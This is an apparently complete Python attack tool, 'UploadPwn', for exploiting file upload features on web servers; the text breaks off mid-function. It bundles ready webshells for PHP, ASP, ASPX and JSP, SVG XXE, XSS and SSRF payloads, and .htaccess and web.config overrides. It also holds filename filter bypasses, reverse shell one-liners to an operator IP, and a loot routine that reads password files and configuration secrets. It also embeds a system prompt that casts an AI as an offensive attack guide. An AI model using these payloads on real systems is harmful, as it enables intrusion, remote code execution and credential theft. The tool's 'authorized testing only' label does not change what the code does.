#!/usr/bin/env python3
"""
UploadPwn v5.0 - AI-Powered Universal File Upload Attack Tool
For authorized penetration testing and CTF/HTB lab environments only.
"""

import requests, sys, time, base64, threading, argparse, os, re, json
from urllib.parse import quote, urljoin
from datetime import datetime
from pathlib import Path

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    SELENIUM_OK = True
except ImportError:
    SELENIUM_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

# ─── ANSI ─────────────────────────────────────────────────────────────────────
R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
M="\033[95m"; C="\033[96m"; W="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"

def p(color, tag, msg): print(f"{color}{BOLD}[{tag}]{W} {msg}")
def ok(m):   p(G,"✓",m)
def fail(m): p(R,"✗",m)
def info(m): p(B,"*",m)
def warn(m): p(Y,"!",m)
def pwn(m):  p(M,"!!!",m)
def ai(m):   p(C,"AI",m)

BANNER = f"""{C}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║              U P L O A D P W N  v5.0  [ AI Edition ]            ║
║        Universal File Upload Attack Tool — OSCP/HTB Edition      ║
╠══════════════════════════════════════════════════════════════════╣
║  ✓ AI-Powered Analysis   ✓ Auto Filter Detection                 ║
║  ✓ Multi-Step Login      ✓ Interactive WebShell                  ║
║  ✓ Zero Hardcoded Data   ✓ Beginner Friendly + Expert Power      ║
║  ✓ Every Upload Attack   ✓ Live AI Guidance                      ║
╚══════════════════════════════════════════════════════════════════╝
{W}"""

# ═══════════════════════════════════════════════════════════════════════════════
# AI ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

SYSTEM_PROMPT = """
You are UploadPwn-AI, an expert offensive security assistant embedded inside
a professional penetration testing tool focused exclusively on file upload
vulnerabilities. You assist authorized penetration testers working on CTF
labs (HTB, TryHackMe, OSCP) and real client engagements.

YOUR CORE MISSION: When given scan context, you analyze, plan, explain,
and guide the operator through every file upload attack scenario.

DECISION LOGIC:
- PHP server → try .phtml/.phar/.pht before .php; use .htaccess as backup
- IIS/ASP → web.config, .aspx, .asp, NTFS ADS
- Java/Tomcat → .jsp, .jspx, .war
- SVG allowed → ALWAYS try XXE read of /flag.txt first (fastest CTF path)
- MIME only → GIF89a + .php wins
- CT only → spoof Content-Type, upload .php
- Both MIME+CT → GIF89a + spoofed CT + .php
- Whitelist → .htaccess first, then reverse double ext (shell.php.jpg)
- Blacklist → .phtml, .pht, .php5, case variants
- All ext fail → race condition, zip slip, ImageTragick, metadata

OUTPUT FORMAT — always use these sections:
## SITUATION ASSESSMENT
## FILTER BREAKDOWN  
## ATTACK PLAN (numbered, with WHY each step works)
## BEGINNER EXPLANATION (plain English, no unexplained jargon)
## EXACT COMMANDS (copy-paste ready uploadpwn.py flags + curl)
## NEXT BEST MOVE (single decisive recommendation)

For every technique include:
┌─ WHY THIS WORKS ─────────────────────────────────────────────┐
│ [What the server checks vs what it misses]                   │
│ [Plain English analogy]                                      │
└──────────────────────────────────────────────────────────────┘

TONE: Senior pen tester guiding a junior analyst. Confident,
patient, decisive, practical. Always give ONE best move.

SCOPE: Authorized CTF/lab/pentest use only.
"""

class AIEngine:
    """Calls Claude claude-sonnet-4-6 for intelligent attack guidance."""

    def __init__(self, enabled=True):
        self.enabled = enabled
        self.api_url = "https://api.anthropic.com/v1/messages"
        self.model   = "claude-opus-4-6"
        self.history = []   # conversation history for follow-ups

    def _call(self, user_message: str) -> str:
        """Make an API call to Claude."""
        self.history.append({"role": "user", "content": user_message})
        try:
            resp = requests.post(
                self.api_url,
                headers={"Content-Type": "application/json"},
                json={
                    "model":      self.model,
                    "max_tokens": 4096,
                    "system":     SYSTEM_PROMPT,
                    "messages":   self.history,
                },
                timeout=60,
            )
            if resp.status_code == 200:
                data    = resp.json()
                content = data["content"][0]["text"]
                self.history.append({"role": "assistant", "content": content})
                return content
            else:
                return f"[AI Error] HTTP {resp.status_code}: {resp.text[:200]}"
        except Exception as e:
            return f"[AI Error] {e}"

    def analyze(self, scan_context: dict, question: str = "") -> str:
        """Send scan results to AI for analysis and attack plan."""
        if not self.enabled:
            return ""
        payload = json.dumps({
            "target":       scan_context.get("target",""),
            "scan_results": scan_context,
            "user_question": question or "Analyze the scan results and give me the best attack plan.",
        }, indent=2)
        return self._call(payload)

    def ask(self, question: str) -> str:
        """Follow-up question in the same conversation context."""
        if not self.enabled:
            return ""
        return self._call(question)

    def diagnose_failure(self, scan_context: dict, what_failed: str) -> str:
        """Ask AI why something failed and what to try next."""
        if not self.enabled:
            return ""
        msg = f"""
The following attack failed: {what_failed}

Current scan context:
{json.dumps(scan_context, indent=2)}

Why did this fail? What should I try next?
Be specific and give me exact commands/flags.
"""
        return self._call(msg)

    def explain_technique(self, technique: str) -> str:
        """Ask AI to explain a technique in beginner-friendly terms."""
        if not self.enabled:
            return ""
        return self._call(
            f"Explain '{technique}' in beginner-friendly terms. "
            f"Include: what it is, why it works, how to use it, and a real analogy."
        )

    def print_ai_response(self, response: str):
        """Pretty-print AI response with formatting."""
        if not response:
            return
        print(f"\n{C}{'═'*65}")
        print(f"  AI ANALYSIS & GUIDANCE")
        print(f"{'═'*65}{W}\n")

        # Highlight section headers
        lines = response.split("\n")
        for line in lines:
            if line.startswith("## "):
                print(f"\n{B}{BOLD}{line}{W}")
            elif line.startswith("┌─") or line.startswith("└─"):
                print(f"{Y}{line}{W}")
            elif line.startswith("│"):
                print(f"{Y}{line}{W}")
            elif line.strip().startswith("→") or line.strip().startswith("-"):
                print(f"  {G}{line}{W}")
            elif any(line.strip().startswith(f"{i}.") for i in range(1,20)):
                print(f"  {M}{line}{W}")
            else:
                print(line)

        print(f"\n{C}{'═'*65}{W}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# DISCOVERY ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Discovery:
    def __init__(self, target, outfile="uploadpwn_report.json"):
        self.target       = target
        self.outfile      = outfile
        self.start_ts     = datetime.now().isoformat()
        self.steps        = []
        self.filters      = {}
        self.rce          = []
        self.flags        = []
        self.sources      = {}
        self.xxe_reads    = {}
        self.suggestions  = []
        self.server_info  = {}
        self.attack_log   = []

    def log(self, category, status, detail, extra=None):
        entry = {"ts": datetime.now().isoformat(), "category": category,
                 "status": status, "detail": detail}
        if extra: entry["extra"] = extra
        self.steps.append(entry)
        self.attack_log.append(f"[{status.upper()}] {category}: {detail}")
        color = G if status in ("found","bypassed") else \
                R if status == "failed" else Y
        tag = {"found":"DISCOVERED","bypassed":"BYPASSED",
               "failed":"×","info":"INFO"}.get(status, status)
        print(f"  {color}{BOLD}[{tag}]{W} {DIM}{category}{W}: {detail}")

    def filter_detected(self, name):
        self.filters[name] = "present"
        self.log("filter","found",f"Filter detected: {name}")

    def filter_bypassed(self, name, method):
        self.filters[name] = "bypassed"
        self.log("filter","bypassed",f"'{name}' bypassed via: {method}")

    def record_rce(self, filename, url, output, shell, ct):
        self.rce.append({"file":filename,"url":url,
                         "output":output[:500],"shell":shell,"ct":ct})
        self.log("RCE","found",f"RCE via '{filename}' shell={shell}",{"url":url})

    def record_flag(self, flag):  self.flags.append(flag)
    def record_source(self, f,c): self.sources[f] = c
    def record_xxe(self, p,c):   self.xxe_reads[p] = c
    def suggest(self, m):         self.suggestions.append(m)

    def to_scan_context(self):
        """Export current state as dict for AI analysis."""
        return {
            "target":           self.target,
            "filters_detected": [k for k,v in self.filters.items() if v == "present"],
            "filters_bypassed": [k for k,v in self.filters.items() if v == "bypassed"],
            "rce_confirmed":    len(self.rce) > 0,
            "rce_entries":      self.rce,
            "flags":            self.flags,
            "server_info":      self.server_info,
            "error_messages":   [],
            "attack_log":       self.attack_log[-30:],
            "suggestions":      self.suggestions,
            "sources_read":     list(self.sources.keys()),
            "xxe_files_read":   list(self.xxe_reads.keys()),
        }

    def print_report(self):
        print(f"\n{C}{BOLD}{'═'*65}")
        print(f"  UPLOADPWN FINAL REPORT — {self.target}")
        print(f"{'═'*65}{W}")

        print(f"\n{B}{BOLD}  FILTERS:{W}")
        if self.filters:
            for name, status in self.filters.items():
                icon = f"{G}✓ bypassed{W}" if status=="bypassed" else f"{Y}● present{W}"
                print(f"    {icon}  {name}")
        else:
            print(f"    {DIM}None detected{W}")

        print(f"\n{B}{BOLD}  ATTACK STEPS ({len(self.steps)}):{W}")
        for i,s in enumerate(self.steps, 1):
            color = G if s["status"] in ("found","bypassed") else \
                    R if s["status"]=="failed" else Y
            print(f"  {DIM}{i:>3}.{W} {color}{s['status'].upper():<10}{W} "
                  f"{s['category']:<22} {s['detail'][:50]}")

        if self.rce:
            print(f"\n{M}{BOLD}  RCE CONFIRMED ({len(self.rce)}):{W}")
            for r in self.rce:
                print(f"    {G}✓{W} {r['file']}")
                print(f"       URL   : {r['url']}")
                print(f"       Shell : {r['shell']} | CT: {r['ct']}")

        if self.flags:
            print(f"\n{Y}{BOLD}  FLAGS / LOOT:{W}")
            for f in self.flags:
                print(f"    {Y}{BOLD}★  {f}{W}")

        if self.suggestions:
            print(f"\n{Y}{BOLD}  AI SUGGESTIONS:{W}")
            for s in self.suggestions:
                print(f"    → {s}")

        print(f"\n{DIM}  Report saved: {self.outfile}{W}")
        print(f"{C}{BOLD}{'═'*65}{W}\n")

    def save(self):
        report = {"target":self.target,"start":self.start_ts,
                  "end":datetime.now().isoformat(),"filters":self.filters,
                  "rce":self.rce,"flags":self.flags,"sources":self.sources,
                  "xxe_reads":self.xxe_reads,"steps":self.steps}
        with open(self.outfile,"w") as f:
            json.dump(report, f, indent=2)


# ═══════════════════════════════════════════════════════════════════════════════
# PAYLOADS
# ═══════════════════════════════════════════════════════════════════════════════

SHELLS = {
    "standard":   b"<?php system($_GET['cmd']); ?>",
    "tiny":       b"<?=`$_GET[0]`?>",
    "passthru":   b"<?php passthru($_GET['cmd']); ?>",
    "gif_magic":  b"GIF89a;\n<?php system($_GET['cmd']); ?>",
    "png_magic":  b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>",
    "jpeg_magic": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>",
    "gif_tiny":   b"GIF89a;\n<?=`$_GET[0]`?>",
    "gif_popen":  b"GIF89a;\n<?php $h=popen($_GET['cmd'],'r');while(!feof($h))echo fgets($h);pclose($h);?>",
}
ASP_SHELLS = {
    "asp":  b'<%Response.write(CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd")).StdOut.ReadAll())%>',
    "aspx": b'<%@ Page Language="C#"%><%System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>',
}
JSP_SHELLS = {
    "jsp": b'<%Runtime r=Runtime.getRuntime();Process p=r.exec(request.getParameter("cmd"));java.io.InputStream is=p.getInputStream();java.util.Scanner s=new java.util.Scanner(is).useDelimiter("\\A");out.println(s.hasNext()?s.next():"");%>',
}

ALL_SHELLS = {**SHELLS, **ASP_SHELLS, **JSP_SHELLS}

SVG_XXE_FILE = lambda p: f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://{p}">]><svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"><text x="0" y="20">&xxe;</text></svg>'.encode()
SVG_XXE_B64  = lambda p: f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={p}">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>'.encode()
SVG_XSS      = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle r="50"/></svg>'
SVG_SSRF     = lambda u: f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "{u}">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>'.encode()

HTACCESS_PAYLOADS = [
    b"AddType application/x-httpd-php .jpg .jpeg .png .gif .svg .xml .xxx\n",
    b"AddHandler application/x-httpd-php .jpg .jpeg .png .gif\n",
    b"<FilesMatch \".\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n",
    b"Options +ExecCGI\nAddHandler php-script .jpg .png .gif\n",
]

WEBCONFIG = b"""<?xml version="1.0" encoding="UTF-8"?>
<configuration><system.webServer><handlers accessPolicy="Read, Script, Write">
<add name="wc" path="*.config" verb="*" modules="IsapiModule"
scriptProcessor="%windir%\\system32\\inetsrv\\asp.dll"
resourceType="Unspecified" requireAccess="Write" preCondition="bitness64"/>
</handlers><security><requestFiltering><fileExtensions>
<remove fileExtension=".config"/></fileExtensions></requestFiltering>
</security></system.webServer></configuration>
<!--<%Response.write(CreateObject("WScript.Shell").Exec("cmd /c "&Request("cmd")).StdOut.ReadAll())%>-->"""

PHP_EXTS = [
    ".php",".php3",".php4",".php5",".php7",".php8",
    ".phtml",".phar",".phps",".pht",".pgif",".inc",
    ".PHP",".Php",".pHp",".phP",".PHp",".PhP",".pHP",
]
ALLOWED_EXTS  = [".jpg",".jpeg",".png",".gif",".webp",".bmp",".svg"]
INJECT_CHARS  = ["%20","%0a","%00","%0d0a","/",".\\"," ",".",
                 "...","::","::$DATA","%2500","%252e"]
CT_IMAGE = ["image/jpeg","image/jpg","image/png","image/gif",
            "image/webp","image/svg+xml","image/bmp","image/tiff"]
CT_MISC  = ["application/octet-stream","text/plain",
            "multipart/form-data","application/x-php"]

DEFAULT_SHELL_DIRS = [
    "/profile_images/","/uploads/","/upload/","/files/",
    "/images/","/media/","/tmp/","/assets/uploads/",
    "/storage/","/public/uploads/","/avatars/",
    "/attachments/","/static/","/data/","/userfiles/",
    "/wp-content/uploads/","/sites/default/files/",
]

def gen_all_filenames():
    names = []
    for e in PHP_EXTS: names.append(f"shell{e}")
    for php in PHP_EXTS:
        for img in ALLOWED_EXTS:
            names.append(f"shell{img}{php}")
            names.append(f"shell{php}{img}")
    for char in INJECT_CHARS:
        for php in PHP_EXTS:
            for img in [".jpg",".png",".gif"]:
                names.append(f"shell{php}{char}{img}")
                names.append(f"shell{img}{char}{php}")
    for php in PHP_EXTS:
        for s in ["."," ","...","::$DATA"]: names.append(f"shell{php}{s}")
    for php in PHP_EXTS:
        for pre in ["../","../../","..%2f","....///"]:
            names.append(f"{pre}shell{php}")
    return list(dict.fromkeys(names))

def build_matrix(filename):
    matrix = []
    for sname,sbytes in ALL_SHELLS.items():
        for ct in CT_IMAGE + CT_MISC:
            matrix.append((filename, sbytes, ct, sname))
    return matrix


# ═══════════════════════════════════════════════════════════════════════════════
# SESSION MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class SessionManager:
    def __init__(self, target, login_url=None, creds=None,
                 nav_url=None, upload_page=None,
                 user_field="username", pass_field="password",
                 extra_headers=None, extra_cookies=None,
                 disc: Discovery=None):
        self.target      = target
        self.login_url   = login_url
        self.creds       = creds or {}
        self.nav_url     = nav_url
        self.upload_page = upload_page
        self.user_field  = user_field
        self.pass_field  = pass_field
        self.d           = disc
        self.session     = requests.Session()
        self.session.headers.update(
            {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"})
        if extra_headers:
            for h in extra_headers:
                k,v = h.split(":",1); self.session.headers[k.strip()] = v.strip()
        if extra_cookies:
            for c in extra_cookies:
                k,v = c.split("=",1); self.session.cookies.set(k.strip(),v.strip())

    def _get_csrf(self, url):
        try:
            r = self.session.get(url, timeout=10)
            for pat in [
                r'<meta[^>]+name=["\']csrf[_-]?token["\'][^>]+content=["\']([^"\']+)["\']',
                r'<input[^>]+name=["\'](_token|csrf[_-]?token|authenticity_token)["\'][^>]+value=["\']([^"\']+)["\']',
            ]:
                m = re.search(pat, r.text, re.I)
                if m: return m.group(m.lastindex)
        except: pass
        return None

    def _parse_form(self, url):
        try:
            r = self.session.get(url, timeout=10)
            if not BS4_OK:
                return urljoin(url,"/login"),"post",{
                    self.user_field:self.creds.get("username",""),
                    self.pass_field:self.creds.get("password","")}
            soup   = BeautifulSoup(r.text,"html.parser")
            form   = soup.find("form")
            if not form: return url,"post",{}
            action = urljoin(url, form.get("action",url))
            method = form.get("method","post").lower()
            fields = {}
            for inp in form.find_all(["input","select","textarea"]):
                n = inp.get("name")
                if n: fields[n] = inp.get("value","")
            return action, method, fields
        except:
            return url,"post",{}

    def login_requests(self):
        if not self.login_url or not self.creds: return True
        info(f"LOGIN → {self.login_url}")
        action, method, fields = self._parse_form(self.login_url)
        for k in list(fields.keys()):
            kl = k.lower()
            if any(x in kl for x in ["user","email","login","name"]):
                fields[k] = self.creds.get("username","")
            if any(x in kl for x in ["pass","pwd","secret"]):
                fields[k] = self.creds.get("password","")
        fields[self.user_field] = self.creds.get("username","")
        fields[self.pass_field] = self.creds.get("password","")
        info(f"  Fields detected: {list(fields.keys())}")
        try:
            fn = self.session.post if method=="post" else self.session.get
            r  = fn(action, data=fields, allow_redirects=True, timeout=15)
            ok(f"Login submitted (HTTP {r.status_code}) → {r.url}")
            page = r.text.lower()
            if any(x in page for x in ["logout","dashboard","welcome",
                                        "profile","sign out","my account"]):
                ok("Login confirmed")
                if self.d: self.d.log("login","found","Authenticated successfully")
                return True
            warn("Login ambiguous — continuing")
            return True
        except Exception as e:
            fail(f"Login error: {e}"); return False

    def navigate_to_upload_page(self):
        for url_attr in [self.nav_url, self.upload_page]:
            if url_attr:
                info(f"NAVIGATE → {url_attr}")
                try:
                    r = self.session.get(url_attr, timeout=10, allow_redirects=True)
                    ok(f"Page loaded (HTTP {r.status_code})")
                    return r
                except Exception as e:
                    fail(f"Navigation error: {e}")
        return None

    def login_selenium(self, headless=True):
        if not SELENIUM_OK: fail("pip install selenium"); return False
        info(f"BROWSER LOGIN → {self.login_url}")
        try:
            opts = webdriver.ChromeOptions()
            if headless: opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(options=opts)
            driver.get(self.login_url); time.sleep(1)
            for sel in [f"input[name='{self.user_field}']",
                        "input[type='email']","input[type='text']"]:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    el.clear(); el.send_keys(self.creds.get("username","")); break
                except: pass
            for sel in [f"input[name='{self.pass_field}']","input[type='password']"]:
                try:
                    el = driver.find_element(By.CSS_SELECTOR, sel)
                    el.clear(); el.send_keys(self.creds.get("password","")); break
                except: pass
            for sel in ["button[type='submit']","input[type='submit']","form button"]:
                try: driver.find_element(By.CSS_SELECTOR, sel).click(); break
                except: pass
            time.sleep(2)
            if self.nav_url:
                driver.get(urljoin(self.target, self.nav_url)); time.sleep(1)
            if self.upload_page:
                driver.get(urljoin(self.target, self.upload_page)); time.sleep(1)
            for cookie in driver.get_cookies():
                self.session.cookies.set(cookie["name"], cookie["value"])
            ok("Browser login done — cookies transferred")
            if self.d: self.d.log("login","found","Selenium login successful")
            driver.quit(); return True
        except Exception as e:
            fail(f"Selenium: {e}"); return False

    def login(self, method="auto"):
        if   method == "selenium": return self.login_selenium()
        elif method == "requests": return self.login_requests()
        else:
            if not self.login_requests() and SELENIUM_OK:
                warn("Trying browser login...")
                return self.login_selenium()
            return True

    def detect_server(self, url):
        """Fingerprint server from response headers."""
        try:
            r = self.session.get(url, timeout=10)
            info_map = {}
            for h in ["Server","X-Powered-By","X-AspNet-Version","X-Generator"]:
                v = r.headers.get(h)
                if v: info_map[h] = v
            if info_map and self.d:
                self.d.server_info = info_map
                ok(f"Server fingerprint: {info_map}")
            return info_map
        except: return {}

    def find_upload_field(self):
        page = self.upload_page or self.target
        try:
            r = self.session.get(page, timeout=10)
            if BS4_OK:
                soup = BeautifulSoup(r.text,"html.parser")
                for inp in soup.find_all("input",{"type":"file"}):
                    n = inp.get("name")
                    if n: ok(f"Upload field: '{n}'"); return n
            m = re.search(
                r'<input[^>]+type=["\']file["\'][^>]+name=["\']([^"\']+)["\']',
                r.text, re.I)
            if m: ok(f"Upload field: '{m.group(1)}'"); return m.group(1)
        except: pass
        return None

    def find_upload_endpoint(self):
        page = self.upload_page or self.target
        try:
            r = self.session.get(page, timeout=10)
            if BS4_OK:
                soup = BeautifulSoup(r.text,"html.parser")
                for form in soup.find_all("form"):
                    if form.find("input",{"type":"file"}):
                        action = form.get("action")
                        if action:
                            full = urljoin(page, action)
                            ok(f"Upload endpoint: {full}"); return full
        except: pass
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# FILTER PROBE
# ═══════════════════════════════════════════════════════════════════════════════

class FilterProbe:
    def __init__(self, upload_fn, disc: Discovery, field="uploadFile"):
        self.upload = upload_fn
        self.d      = disc

    def _ok(self, s, b):
        if s not in [200,201,302]: return False
        bad = ["only images","not allowed","invalid","blocked","failed",
               "disallowed","rejected","extension","mime","forbidden"]
        return not any(k in b.lower() for k in bad)

    def probe_all(self):
        info("PROBE: Fingerprinting filters...")
        self._ext_php()
        self._ext_phtml()
        self._whitelist()
        self._content_type()
        self._mime()
        self._null_byte()
        self._svg()
        self._size()
        print()

    def _ext_php(self):
        s,b = self.upload("shell.php",b"<?php phpinfo();?>","application/x-php")[:2]
        if not self._ok(s,b): self.d.filter_detected("Extension Filter (.php blocked)")
        else: self.d.log("probe","info",".php accepted — minimal filtering")

    def _ext_phtml(self):
        s,b = self.upload("shell.phtml",b"<?php phpinfo();?>","image/jpeg")[:2]
        if self._ok(s,b):
            self.d.log("probe","info",".phtml accepted → incomplete blacklist")
            self.d.suggest("Use .phtml/.pht/.php5 to bypass blacklist")
        else: self.d.filter_detected("Blacklist (PHP variants)")

    def _whitelist(self):
        s,b = self.upload("shell.jpg",b"<?php phpinfo();?>","image/jpeg")[:2]
        if not self._ok(s,b): self.d.filter_detected("Whitelist (ext OR content check)")

    def _content_type(self):
        s,b = self.upload("shell.php",b"<?php phpinfo();?>","image/jpeg")[:2]
        if self._ok(s,b): self.d.filter_bypassed("Content-Type","spoof to image/jpeg")
        else: self.d.filter_detected("Content-Type Header Filter")

    def _mime(self):
        s,b = self.upload("shell.php",b"GIF89a;\n<?php phpinfo();?>","image/gif")[:2]
        if self._ok(s,b): self.d.filter_bypassed("MIME","GIF89a magic bytes")
        else:
            self.d.filter_detected("MIME/Magic-Byte Filter")
            self.d.suggest("GIF blocked — try PNG or JPEG magic bytes")

    def _null_byte(self):
        s,b = self.upload("shell.php%00.jpg",b"<?php phpinfo();?>","image/jpeg")[:2]
        if self._ok(s,b):
            self.d.filter_bypassed("Extension Filter","null byte shell.php%00.jpg")
            self.d.suggest("Null byte works — PHP <5.3.4 truncation")

    def _svg(self):
        s,b = self.upload("t.svg",
            b'<svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>',
            "image/svg+xml")[:2]
        if self._ok(s,b):
            self.d.log("probe","found","SVG allowed → XXE/XSS surface")
            self.d.suggest("Try --svg-read /flag.txt FIRST (fastest CTF path)")

    def _size(self):
        s,b = self.upload("big.jpg",b"A"*5*1024*1024,"image/jpeg")[:2]
        if not self._ok(s,b):
            self.d.filter_detected("File Size Limit")
            self.d.suggest("Use tiny shell: <?=`$_GET[0]`?>")


# ═══════════════════════════════════════════════════════════════════════════════
# INTERACTIVE WEBSHELL
# ═══════════════════════════════════════════════════════════════════════════════

class WebShell:
    def __init__(self, session, shell_url, cmd_param="cmd",
                 disc: Discovery=None, ai_engine: AIEngine=None):
        self.session   = session
        self.shell_url = shell_url
        self.cmd_param = cmd_param
        self.d         = disc
        self.ai        = ai_engine
        self.history   = []

    def run(self, cmd):
        url = f"{self.shell_url}?{self.cmd_param}={quote(cmd)}"
        try:
            r   = self.session.get(url, timeout=20)
            out = r.text.strip()
            if out.startswith("GIF89a"): out = out[6:].lstrip(";\n")
            return out
        except Exception as e:
            return f"[ERROR] {e}"

    def _walkthrough(self, fname, shell, ct):
        print(f"""
{C}{BOLD}╔══════════════════════════════════════════════════════════════╗
║           RCE WALKTHROUGH — HOW WE GOT SHELL                ║
╚══════════════════════════════════════════════════════════════╝{W}

{B}{BOLD}WHAT WORKED:{W}
  Filename     : {G}{fname}{W}
  Shell type   : {G}{shell}{W}
  Content-Type : {G}{ct}{W}
  Shell URL    : {G}{self.shell_url}{W}
  CMD param    : {G}{self.cmd_param}{W}

{B}{BOLD}MANUAL REPRODUCTION (curl):{W}
  {G}# Execute any command:{W}
  curl '{self.shell_url}?{self.cmd_param}=id'
  curl '{self.shell_url}?{self.cmd_param}=whoami'
  curl '{self.shell_url}?{self.cmd_param}=cat+/flag.txt'

  {G}# URL-encode complex commands:{W}
  curl '{self.shell_url}?{self.cmd_param}=cat%20/etc/passwd'
""")

    def interactive(self, fname="", shell="", ct=""):
        self._walkthrough(fname, shell, ct)

        # Quick recon
        info("Quick recon...")
        for label, cmd in [("whoami","whoami"),("id","id"),
                            ("hostname","hostname"),("pwd","pwd")]:
            out = self.run(cmd)
            print(f"  {G}{label:<10}{W}: {out}")

        print(f"""
{C}{BOLD}  INTERACTIVE WEBSHELL  {W}
  URL   : {self.shell_url}
  Param : {self.cmd_param}

{Y}  Built-in commands:{W}
    !read <path>           — read a file
    !ls <path>             — list directory
    !find <name>           — find files by name
    !revshell <ip> <port>  — reverse shell one-liners
    !loot                  — auto-collect privilege escalation info
    !ai <question>         — ask AI for guidance
    !history               — command history
    !exit                  — exit
    <anything>             — execute on server
""")
        while True:
            try:
                cmd = input(f"{M}{BOLD}webshell{W} {B}>{W} ").strip()
            except (KeyboardInterrupt, EOFError):
                print(); break
            if not cmd: continue
            self.history.append(cmd)

            if cmd == "!exit":
                break
            elif cmd == "!history":
                for i,c in enumerate(self.history,1):
                    print(f"  {DIM}{i:>3}  {c}{W}")
            elif cmd.startswith("!read "):
                path = cmd[6:].strip()
                out  = self.run(f"cat {path}")
                print(f"\n{G}--- {path} ---{W}\n{out}")
                if self.d and out: self.d.record_flag(out) if "HTB{" in out else None
            elif cmd.startswith("!ls "):
                print(self.run(f"ls -la {cmd[4:].strip()}"))
            elif cmd.startswith("!find "):
                print(self.run(f"find / -name '{cmd[6:].strip()}' 2>/dev/null"))
            elif cmd.startswith("!revshell "):
                parts = cmd.split()
                if len(parts) >= 3:
                    ip, port = parts[1], parts[2]
                    print(f"""
{Y}Reverse Shell One-Liners:{W}
  bash  : bash -i >& /dev/tcp/{ip}/{port} 0>&1
  nc    : nc -e /bin/bash {ip} {port}
  python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),x) for x in range(3)];subprocess.call(["/bin/bash"])'
  perl  : perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in({port},inet_aton("{ip}")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash")'

{G}Listener:{W}  nc -lvnp {port}
""")
            elif cmd == "!loot":
                for label, lcmd in [
                    ("whoami/id",     "id"),
                    ("OS",            "cat /etc/os-release 2>/dev/null"),
                    ("Users",         "cat /etc/passwd"),
                    ("Sudo",          "sudo -l 2>/dev/null"),
                    ("SUID",          "find / -perm -4000 2>/dev/null | head -20"),
                    ("Crons",         "cat /etc/crontab 2>/dev/null"),
                    ("Network",       "ip a 2>/dev/null || ifconfig"),
                    ("Listening",     "ss -tlnp 2>/dev/null"),
                    ("Env",           "env | grep -i pass 2>/dev/null"),
                    ("Writable",      "find / -writable -type d 2>/dev/null | head -10"),
                    ("Config files",  "find /var/www -name '*.php' -exec grep -l 'password' {} \\; 2>/dev/null | head -5"),
                ]:
                    out = self.run(lcmd)
                    if out:
                        print(f"\n{G}{BOLD}[{label}]{W}\n{out[:500]}")
                        if self.d: self.d.log("loot","found",f"{label}: {out[:60]}")
            elif cmd.startswith("!ai "):
                if self.ai:
                    question = cmd[4:].strip()
                    ai(f"Asking AI: {question}")
                    ctx = self.d.to_scan_context() if self.d else {}
                    ctx["shell_url"]  = self.shell_url
                    ctx["last_cmd"]   = self.history[-5:]
                    resp = self.ai.analyze(ctx, question)
                    self.ai.print_ai_response(resp)
                else:
                    warn("AI not enabled (no API key)")
            else:
                out = self.run(cmd)
                print(out if out else f"{DIM}(no output){W}")


# ═══════════════════════════════════════════════════════════════════════════════
# CORE ATTACKER
# ═══════════════════════════════════════════════════════════════════════════════

class UploadAttacker:
    def __init__(self, sm: SessionManager, upload_url, shell_dirs,
                 cmd_param="cmd", field="uploadFile",
                 flag_path="/flag.txt", verbose=False,
                 disc: Discovery=None, ai_engine: AIEngine=None,
                 interactive=False):
        self.sm          = sm
        self.upload_url  = upload_url
        self.shell_dirs  = shell_dirs
        self.cmd_param   = cmd_param
        self.field       = field
        self.flag_path   = flag_path
        self.verbose     = verbose
        self.d           = disc
        self.ai          = ai_engine
        self.interactive = interactive

    def upload(self, filename, content, content_type, extra_fields=None):
        files = {self.field: (filename, content, content_type)}
        try:
            r = self.sm.session.post(self.upload_url,
                files=files, data=extra_fields or {},
                allow_redirects=True, timeout=15)
            return r.status_code, r.text, r
        except Exception as e:
            return 0, str(e), None

    def is_success(self, status, body):
        if status not in [200,201,302]: return False
        bad = ["only images","not allowed","invalid","blocked","failed",
               "disallowed","rejected","extension","mime","forbidden","error"]
        return not any(k in body.lower() for k in bad)

    def verify_rce(self, filename, cmd="id"):
        clean = re.sub(r'\.\.+[/\\]','',
                os.path.basename(filename.lstrip("./").lstrip("%2f")))
        candidates = list(dict.fromkeys([clean, filename,
                                          os.path.basename(filename)]))
        for d in self.shell_dirs:
            for fn in candidates:
                for param in [self.cmd_param,"0","c","1","exec","command"]:
